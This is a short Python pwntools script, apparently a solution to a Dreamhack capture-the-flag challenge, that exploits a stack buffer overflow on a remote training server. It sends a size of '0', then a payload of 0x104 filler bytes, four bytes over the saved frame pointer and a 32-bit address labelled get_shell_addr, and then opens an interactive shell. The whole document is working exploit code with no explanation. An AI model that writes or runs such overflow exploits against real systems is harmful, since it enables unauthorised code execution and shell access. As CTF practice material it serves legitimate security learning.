from pwn import *
context.log_level='debug'

n = remote('host1.dreamhack.games',8367)

get_shell_addr = 0x08048659

payload1 = '0'
payload2 = b'A'*0x104
payload2 += b'B'*0x4
payload2 += p32(get_shell_addr)

n.sendafter('Size:',payload1)
n.send(payload2)

n.interactive()
